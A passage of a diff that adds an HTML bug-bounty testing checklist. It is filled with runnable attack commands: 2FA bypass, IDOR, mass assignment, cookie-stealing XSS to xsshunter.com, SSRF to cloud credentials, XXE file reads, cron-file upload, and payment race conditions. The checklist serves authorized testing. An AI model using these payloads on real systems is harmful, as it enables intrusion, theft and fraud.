+            <div class="item-cmd note">Check for response_type=token — then look for external script/img loads on callback page</div>
+          </div>
+        </div>
+
+        <div class="subsection-title">2fa / mfa</div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">2FA bypass — response manipulation (change verified:false to true)</span><span class="tag tag-high">High Value</span></div>
+            <div class="item-cmd note">Burp: Intercept 2FA POST response → change {"verified":false,"next":"/2fa"} to {"verified":true,"next":"/dashboard"}</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">2FA bypass — skip step entirely by directly requesting post-2FA endpoint</span><span class="tag tag-high">High Value</span></div>
+            <div class="item-cmd">curl -s https://target.com/dashboard -H "Cookie: session=VALID_SESSION_BEFORE_2FA" # Does it redirect or serve dashboard?</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">2FA code reuse — already used code should be invalid</span><span class="tag tag-missed">Often Missed</span></div>
+            <div class="item-cmd">curl -s -X POST https://target.com/verify-otp -d '{"code":"123456"}' -H "Cookie: session=TOKEN" # Then repeat same request</div>
+          </div>
+        </div>
+
+      </div>
+      <div class="notes-section">
+        <div class="notes-label">Phase Notes / Findings</div>
+        <textarea class="notes-field" placeholder="e.g. Password reset vulnerable to host header injection, JWT uses HS256 with secret 'secret', 2FA code reusable within 5min window..."></textarea>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══════════════════════════════════════════ -->
+  <!-- PHASE 7 — Authorization Testing: IDOR & Privesc -->
+  <!-- ══════════════════════════════════════════ -->
+  <div class="phase" id="phase-7">
+    <div class="phase-header" onclick="togglePhase('phase-7')">
+      <div class="phase-num">PHASE 07</div>
+      <div class="phase-title">Authorization Testing — IDOR &amp; Privilege Escalation</div>
+      <div class="phase-meta">
+        <div class="phase-progress-mini"><div class="mini-bar"><div class="mini-fill" id="bar-phase-7"></div></div><span id="pct-phase-7">0%</span></div>
+        <div class="phase-chevron">▼</div>
+      </div>
+    </div>
+    <div class="phase-body">
+      <div class="items-list" data-phase="phase-7">
+
+        <div class="subsection-title">idor hunting</div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Enumerate all object IDs — numeric sequential, UUID, GUID, hashed</span><span class="tag tag-critical">Critical</span></div>
+            <div class="item-cmd">ffuf -u "https://target.com/api/v1/users/FUZZ/profile" -w <(seq 1 10000) -H "Authorization: Bearer USER_B_TOKEN" -mc 200 -o idor-numeric.json</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Test IDOR on WRITE operations — edit, delete, update other users' objects</span><span class="tag tag-critical">Critical</span></div>
+            <div class="item-cmd">curl -s -X PUT https://target.com/api/orders/USER_B_ORDER_ID -H "Authorization: Bearer USER_A_TOKEN" -d '{"status":"cancelled"}' -H "Content-Type: application/json"</div>
+            <div class="item-sub">Write IDOR is higher severity than read IDOR. Test PUT, PATCH, DELETE on every object.</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">IDOR on file download endpoints</span><span class="tag tag-high">High Value</span></div>
+            <div class="item-cmd">ffuf -u "https://target.com/api/files/download?id=FUZZ" -w <(seq 1 5000) -H "Authorization: Bearer ATTACKER_TOKEN" -mc 200 -o file-idor.json</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Test GUIDs — NEVER assume they're safe, they leak through other endpoints</span><span class="tag tag-missed">Often Missed</span></div>
+            <div class="item-sub">GUIDs leak via: activity logs, email links, shared URLs, export files, error messages, HTTP Referer. Collect them passively while browsing.</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Decode indirect/encoded object references — base64, MD5, hash</span><span class="tag tag-missed">Often Missed</span></div>
+            <div class="item-cmd">echo "dXNlcl8xMDI=" | base64 -d # Decoded: user_102 — now try user_101, user_103</div>
+            <div class="item-sub">MD5 of email or sequential int is a common "security by obscurity" pattern. Crack it.</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Use Autorize — check every yellow/red flag before moving on</span><span class="tag tag-high">High Value</span></div>
+            <div class="item-sub">Every Autorize flag = potential IDOR. Browse ALL features with Autorize active. Investigate every flagged request.</div>
+          </div>
+        </div>
+
+        <div class="subsection-title">privilege escalation & access control</div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">HTTP method tampering — GET→DELETE/PUT/PATCH on restricted endpoints</span><span class="tag tag-missed">Often Missed</span></div>
+            <div class="item-cmd">for method in GET POST PUT PATCH DELETE OPTIONS; do echo -n "[$method] "; curl -sk -X $method "https://target.com/api/admin/users/1" -H "Authorization: Bearer LOW_PRIV_TOKEN" -w "%{http_code}\n" -o /dev/null; done</div>
+            <div class="item-tool">Also try: X-HTTP-Method-Override: DELETE header on GET requests — some APIs respect it</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Mass assignment — add role, admin, plan, balance to every JSON update request</span><span class="tag tag-critical">Critical</span></div>
+            <div class="item-cmd">curl -s -X PUT https://target.com/api/users/self -H "Authorization: Bearer TOKEN" -d '{"name":"test","role":"admin","isAdmin":true,"plan":"enterprise","is_staff":true,"verified":true,"credits":999999}' -H "Content-Type: application/json"</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Forced browsing — access admin endpoints as regular user</span><span class="tag tag-high">High Value</span></div>
+            <div class="item-cmd">ffuf -u "https://target.com/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -H "Authorization: Bearer LOW_PRIV_TOKEN" -mc 200,201,204 -o forced-browse.json</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Test invitation flow manipulation — change role in invite, redirect to different email</span><span class="tag tag-missed">Often Missed</span></div>
+            <div class="item-cmd">curl -s -X POST https://target.com/api/invite -d '{"email":"victim@target.com","role":"admin"}' -H "Authorization: Bearer MEMBER_TOKEN"</div>
+            <div class="item-sub">Intercept invite → change role to admin → change email to victim. Accept invite as victim → now admin.</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Test API key privilege — does key inherit user role restrictions?</span><span class="tag tag-missed">Often Missed</span></div>
+            <div class="item-cmd">curl -s https://target.com/api/admin/users -H "X-API-Key: REGULAR_USER_API_KEY" # API keys sometimes bypass role checks</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">403 bypass — path manipulation, header injection, encoding tricks</span><span class="tag tag-quick">Quick Win</span></div>
+            <div class="item-cmd">for path in "/admin" "//admin" "/admin/" "/./admin" "/%2fadmin" "/admin;/" "/ADMIN" "/admin%20" "/admin..;" "/admin/."; do echo -n "$path: "; curl -sk -o /dev/null -w "%{http_code}" "https://target.com$path" -H "Authorization: Bearer LOW_TOKEN"; echo; done</div>
+            <div class="item-tool">Also try: X-Original-URL: /admin, X-Rewrite-URL: /admin, Referer: https://target.com/admin headers</div>
+          </div>
+        </div>
+
+      </div>
+      <div class="notes-section">
+        <div class="notes-label">Phase Notes / Findings</div>
+        <textarea class="notes-field" placeholder="e.g. IDOR on /api/invoices/{id} - can read any invoice, mass assignment adds admin role, 403 bypass via X-Original-URL on /admin..."></textarea>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══════════════════════════════════════════ -->
+  <!-- PHASE 8 — Input Validation -->
+  <!-- ══════════════════════════════════════════ -->
+  <div class="phase" id="phase-8">
+    <div class="phase-header" onclick="togglePhase('phase-8')">
+      <div class="phase-num">PHASE 08</div>
+      <div class="phase-title">Input Validation — XSS, SQLi, SSTI, Injections</div>
+      <div class="phase-meta">
+        <div class="phase-progress-mini"><div class="mini-bar"><div class="mini-fill" id="bar-phase-8"></div></div><span id="pct-phase-8">0%</span></div>
+        <div class="phase-chevron">▼</div>
+      </div>
+    </div>
+    <div class="phase-body">
+      <div class="items-list" data-phase="phase-8">
+
+        <div class="subsection-title">cross-site scripting (xss)</div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Reflected XSS — fuzz all URL params with polyglot payload + dalfox</span><span class="tag tag-high">High Value</span></div>
+            <div class="item-cmd">cat gau-urls.txt | gf xss | qsreplace '"><img src=x onerror=alert(1)>' | httpx -mc 200 -sr -srd ./xss-resp/ && dalfox file xss-candidates.txt --skip-bav -o dalfox-results.txt</div>
+            <div class="item-tool">gf (patterns), qsreplace, dalfox: go install github.com/hahwul/dalfox/v2@latest</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Stored XSS — inject in ALL input fields: bio, name, address, comments, titles</span><span class="tag tag-critical">Critical</span></div>
+            <div class="item-cmd">curl -s -X POST https://target.com/api/profile -d '{"bio":"<script src=//xsshunter.com/PAYLOAD></script>","name":"<img src=x onerror=fetch(//xsshunter.com/?c=document.cookie)>"}' -H "Authorization: Bearer TOKEN"</div>
+            <div class="item-tool">XSSHunter (xsshunter.com), Burp Collaborator — blind XSS fires when admin views the data</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">DOM XSS — grep JS source for dangerous sinks + test with DOM Invader</span><span class="tag tag-missed">Often Missed</span></div>
+            <div class="item-cmd">cat js-files.txt | xargs -I{} sh -c 'curl -sk {} | grep -n "innerHTML\|outerHTML\|document.write\|eval(\|location.hash\|location.href\|location.search\|$.html("' | tee dom-sinks.txt</div>
+            <div class="item-sub">Test: url#&lt;img src=x onerror=alert(1)&gt; — DOM sinks reading from URL hash are very common.</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Self-XSS + CSRF = exploitable XSS — chain them</span><span class="tag tag-chain">Chainable</span></div>
+            <div class="item-sub">Self-XSS alone = N/A. Self-XSS + CSRF to force victim into the vulnerable state = HIGH severity.</div>
+          </div>
+        </div>
+
+        <div class="subsection-title">sql, nosql, template injection</div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">SQLi — all parameters: automated sqlmap + manual single-quote test</span><span class="tag tag-critical">Critical</span></div>
+            <div class="item-cmd">cat gau-urls.txt | gf sqli | tee sqli-candidates.txt && sqlmap -m sqli-candidates.txt --headers="Authorization: Bearer TOKEN" --level=5 --risk=3 --batch -o --output-dir=sqlmap/</div>
+            <div class="item-tool">gf sqli pattern — manual test: ' OR '1'='1, 1' AND SLEEP(5)--, 1; SELECT pg_sleep(5)--</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">NoSQL injection on JSON/MongoDB login forms</span><span class="tag tag-missed">Often Missed</span></div>
+            <div class="item-cmd">curl -s -X POST https://target.com/api/login -d '{"username":{"$gt":""},"password":{"$gt":""}}' -H "Content-Type: application/json"</div>
+            <div class="item-sub">Also try: {"username":"admin","password":{"$regex":".*"}} and ?username[$ne]=null&password[$ne]=null for GET params.</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">SSTI — test ALL template engines with polyglot detection payload</span><span class="tag tag-critical">Critical</span></div>
+            <div class="item-cmd">python3 tplmap.py -u 'https://target.com/render?template=*' --os-cmd "id" --level 5</div>
+            <div class="item-sub">Manual test (all at once): {{7*7}}${7*7}#{7*7}{{7*'7'}}*{7*7} — if ANY returns 49 or 7777777 = RCE possible.</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Prototype pollution — inject __proto__ in GET params and JSON body</span><span class="tag tag-missed">Often Missed</span></div>
+            <div class="item-cmd">curl -s "https://target.com/api/search?__proto__[admin]=true&constructor[prototype][admin]=true" -H "Authorization: Bearer TOKEN"</div>
+            <div class="item-sub">Also inject in JSON body: {"__proto__":{"admin":true}} and in URL-encoded: a[__proto__][admin]=true</div>
+          </div>
+        </div>
+
+        <div class="subsection-title">server-side request forgery (ssrf)</div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">SSRF — test all URL parameters pointing to external resources</span><span class="tag tag-critical">Critical</span></div>
+            <div class="item-cmd">cat gau-urls.txt | gf ssrf | qsreplace "http://BURP_COLLABORATOR.burpcollaborator.net" | httpx -mc 200,301,302 -o ssrf-hits.txt</div>
+            <div class="item-tool">gf ssrf pattern — test: http://169.254.169.254/latest/meta-data/ (AWS), http://metadata.google.internal/</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">SSRF via webhooks — test webhook URL for internal network access</span><span class="tag tag-missed">Often Missed</span></div>
+            <div class="item-cmd">curl -s -X POST https://target.com/api/webhooks -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/","events":["all"]}' -H "Authorization: Bearer TOKEN"</div>
+            <div class="item-sub">Webhook functionality is classic SSRF — test internal IPs, cloud metadata, internal service URLs.</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">SSRF via XML (combined XXE) — external entity to internal endpoint</span><span class="tag tag-chain">Chainable</span></div>
+            <div class="item-cmd">curl -s -X POST https://target.com/api/import -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><data>&xxe;</data>' -H "Content-Type: application/xml"</div>
+          </div>
+        </div>
+
+        <div class="subsection-title">other injections</div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">XXE on all XML inputs — file upload, API, DOCX/SVG parsing</span><span class="tag tag-high">High Value</span></div>
+            <div class="item-cmd">curl -s -X POST https://target.com/api/import -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>' -H "Content-Type: application/xml"</div>
+            <div class="item-sub">Also test: SVG file uploads, DOCX/XLSX imports, SOAP APIs — all parse XML and may be vulnerable.</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Blind XXE with out-of-band exfiltration via Burp Collaborator</span><span class="tag tag-missed">Often Missed</span></div>
+            <div class="item-cmd">curl -s -X POST https://target.com/api/import -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://COLLABORATOR.burpcollaborator.net/">]><data>&xxe;</data>' -H "Content-Type: application/xml"</div>
+            <div class="item-sub">No output doesn't mean no XXE — use Collaborator to detect callback even without direct response.</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Path traversal / LFI in file name parameters</span><span class="tag tag-high">High Value</span></div>
+            <div class="item-cmd">ffuf -u "https://target.com/api/file?name=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -H "Authorization: Bearer TOKEN" -mc 200 -fs 0 -o lfi-results.json</div>
+            <div class="item-sub">Also try: ....//....//etc/passwd, ..%2F..%2Fetc%2Fpasswd, ..%252F..%252Fetc%252Fpasswd</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">CRLF injection in redirect parameters → HTTP header injection</span><span class="tag tag-missed">Often Missed</span></div>
+            <div class="item-cmd">curl -sk "https://target.com/redirect?url=https://evil.com%0d%0aSet-Cookie:session=attacker%0d%0a" -I | grep -i "set-cookie\|location"</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Email header injection in contact/invite forms</span><span class="tag tag-missed">Often Missed</span></div>
+            <div class="item-cmd">curl -s -X POST https://target.com/api/contact -d '{"to":"victim@test.com%0aCc:attacker@evil.com%0aBcc:attacker@evil.com","subject":"test"}' -H "Content-Type: application/json"</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Open redirect — test all redirect/url/next/return/goto parameters</span><span class="tag tag-quick">Quick Win</span></div>
+            <div class="item-cmd">cat gau-urls.txt | gf redirect | qsreplace "https://evil.com" | httpx -mc 301,302 -o open-redirects.txt</div>
+            <div class="item-sub">Test: //evil.com, ///evil.com, https:evil.com, /\\evil.com, https://target.com.evil.com</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">HTTP Request Smuggling — CL.TE and TE.CL variants</span><span class="tag tag-missed">Often Missed</span></div>
+            <div class="item-cmd">python3 smuggler.py -u https://target.com -l 3 --timeout 10 -x</div>
+            <div class="item-tool">smuggler.py, Burp HTTP Request Smuggler extension (albinowax) — targets reverse proxies/load balancers</div>
+          </div>
+        </div>
+
+      </div>
+      <div class="notes-section">
+        <div class="notes-label">Phase Notes / Findings</div>
+        <textarea class="notes-field" placeholder="e.g. Stored XSS in profile bio, SSTI in email template (Jinja2 {{7*7}}=49), SSRF in webhook URL reads AWS metadata..."></textarea>
+      </div>
+    </div>
+  </div>
+
+  <!-- ════════════════════════════ -->
+  <!-- PHASE 9 — Business Logic Testing -->
+  <!-- ════════════════════════════ -->
+  <div class="phase" id="phase-9">
+    <div class="phase-header" onclick="togglePhase('phase-9')">
+      <div class="phase-num">PHASE 09</div>
+      <div class="phase-title">Business Logic Testing</div>
+      <div class="phase-meta">
+        <div class="phase-progress-mini"><div class="mini-bar"><div class="mini-fill" id="bar-phase-9"></div></div><span id="pct-phase-9">0%</span></div>
+        <div class="phase-chevron">▼</div>
+      </div>
+    </div>
+    <div class="phase-body">
+      <div class="items-list" data-phase="phase-9">
+
+        <div class="subsection-title">payment & cart logic</div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Negative quantities in cart — does account balance increase?</span><span class="tag tag-critical">Critical</span></div>
+            <div class="item-cmd">curl -s -X POST https://target.com/api/cart -d '{"item_id":1,"quantity":-1,"price":-99.99}' -H "Authorization: Bearer TOKEN" -H "Content-Type: application/json"</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Price manipulation — intercept checkout request, modify price before server receives it</span><span class="tag tag-critical">Critical</span></div>
+            <div class="item-cmd note">Burp: intercept final POST /checkout → change amount from 99.99 to 0.01 → forward</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Currency confusion — select cheapest currency, receive premium equivalent</span><span class="tag tag-missed">Often Missed</span></div>
+            <div class="item-cmd">curl -s -X POST https://target.com/api/purchase -d '{"plan":"premium","amount":9.99,"currency":"VND"}' -H "Authorization: Bearer TOKEN" -H "Content-Type: application/json"</div>
+            <div class="item-sub">Set payment in lowest-value currency (VND, RUB) but receive the plan value in USD equivalent.</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Discount code reuse and stacking — apply same coupon 10x in parallel</span><span class="tag tag-quick">Quick Win</span></div>
+            <div class="item-cmd">for i in $(seq 1 10); do curl -s -X POST https://target.com/api/apply-coupon -d '{"code":"SAVE20"}' -H "Authorization: Bearer TOKEN" & done; wait</div>
+            <div class="item-sub">Also: stack multiple different codes, apply expired codes, apply codes from other programs.</div>
+          </div>
+        </div>
+
+        <div class="subsection-title">race conditions</div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Race condition on any single-use action — gift cards, coupons, referral bonuses</span><span class="tag tag-critical">Critical</span></div>
+            <div class="item-cmd">python3 race_the_web.py --url https://target.com/api/redeem --method POST --body '{"code":"GIFT50"}' --requests 25 --threads 25 --cookie "session=TOKEN"</div>
+            <div class="item-tool">Burp Turbo Intruder — use single-packet attack (HTTP/2) for precise race conditions: all requests in one TCP frame</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Race condition on payments — same payment token used 20x simultaneously</span><span class="tag tag-critical">Critical</span></div>
+            <div class="item-cmd">python3 -c "import threading,requests; s=requests.Session(); s.cookies.set('session','TOKEN'); [threading.Thread(target=lambda:s.post('https://target.com/checkout',json={'token':'PAY_TOKEN'})).start() for _ in range(20)]"</div>
+          </div>
+        </div>
+
+        <div class="subsection-title">workflow & access logic</div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Workflow bypass — jump step 1→step 3, skip payment step in checkout</span><span class="tag tag-high">High Value</span></div>
+            <div class="item-cmd">curl -s -X POST https://target.com/api/checkout/step3/confirm -H "Authorization: Bearer TOKEN" -d '{"order_id":"INCOMPLETE_ORDER"}' # Skip payment step 2</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Feature access after plan downgrade — premium feature still accessible?</span><span class="tag tag-missed">Often Missed</span></div>
+            <div class="item-cmd note">Upgrade plan → use premium feature → downgrade → test if premium endpoint still returns data</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Object state confusion — cancel then complete, submit form twice</span><span class="tag tag-missed">Often Missed</span></div>
+            <div class="item-cmd note">Cancel an order → try to complete it. Submit a form twice with same token. What happens to state?</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Account deletion then re-registration — do old permissions or data carry over?</span><span class="tag tag-missed">Often Missed</span></div>
+            <div class="item-cmd note">Delete account → re-register same email → check if old data, roles, or pending invites are accessible</div>
+          </div>
+        </div>
+
+        <div class="subsection-title">file upload attacks</div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">SVG upload for stored XSS — if served with correct MIME type</span><span class="tag tag-high">High Value</span></div>
+            <div class="item-cmd">curl -s -X POST https://target.com/api/upload -F "file=@xss.svg;type=image/svg+xml" -H "Authorization: Bearer TOKEN" # SVG content: &lt;svg&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/svg&gt;</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">File upload extension bypass — try all variants</span><span class="tag tag-high">High Value</span></div>
+            <div class="item-cmd note">Try: file.php.jpg, file.php%00.jpg, file.pHp, file.php5, file.phtml, file.phar, file.shtml — change Content-Type to image/jpeg</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Path traversal in upload filename — write to arbitrary path</span><span class="tag tag-critical">Critical</span></div>
+            <div class="item-cmd">curl -s -X POST https://target.com/api/upload -F "filename=../../etc/cron.d/evil" -F "file=@evil.sh" -H "Authorization: Bearer TOKEN"</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Zip slip — archive with path traversal filenames</span><span class="tag tag-missed">Often Missed</span></div>
+            <div class="item-cmd">python3 -c "import zipfile; z=zipfile.ZipFile('evil.zip','w'); z.write('/etc/passwd','../../../var/www/html/passwd.txt'); z.close()" && curl -s -X POST https://target.com/api/import -F "file=@evil.zip" -H "Authorization: Bearer TOKEN"</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">ImageMagick / FFmpeg SSRF — upload specially crafted image for RCE/SSRF</span><span class="tag tag-critical">Critical</span></div>
+            <div class="item-cmd note">ImageTragick: upload SVG with &lt;image href="http://COLLABORATOR/"&gt;. FFmpeg: craft .avi with SSRF in playlist URL.</div>
+            <div class="item-tool">Affects any app that processes/converts uploaded images using ImageMagick or FFmpeg</div>
+          </div>
+        </div>
+
+      </div>
+      <div class="notes-section">
+        <div class="notes-label">Phase Notes / Findings</div>
+        <textarea class="notes-field" placeholder="e.g. Race condition on gift card endpoint (redeemed 15x), SVG XSS on avatar upload, price parameter not validated server-side..."></textarea>
+      </div>
+    </div>
+  </div>
+
+  <!-- ════════════════════════════ -->
+  <!-- PHASE 10 — API, GraphQL & Misc -->
+  <!-- ════════════════════════════ -->
+  <div class="phase" id="phase-10">
+    <div class="phase-header" onclick="togglePhase('phase-10')">
+      <div class="phase-num">PHASE 10</div>
+      <div class="phase-title">API Security, GraphQL &amp; Misc Attacks</div>
+      <div class="phase-meta">
+        <div class="phase-progress-mini"><div class="mini-bar"><div class="mini-fill" id="bar-phase-10"></div></div><span id="pct-phase-10">0%</span></div>
+        <div class="phase-chevron">▼</div>
+      </div>
+    </div>
+    <div class="phase-body">
+      <div class="items-list" data-phase="phase-10">
+
+        <div class="subsection-title">cors & csrf</div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">CORS misconfiguration — origin reflection and null origin on authenticated endpoints</span><span class="tag tag-high">High Value</span></div>
+            <div class="item-cmd">python3 corsy.py -i https://target.com/api/user/data -H "Cookie: session=TOKEN" -o corsy-results.json</div>
+            <div class="item-sub">Test: Origin: https://attacker.com (reflected?), Origin: null (accepted?), Origin: https://target.com.attacker.com (suffix match?)</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
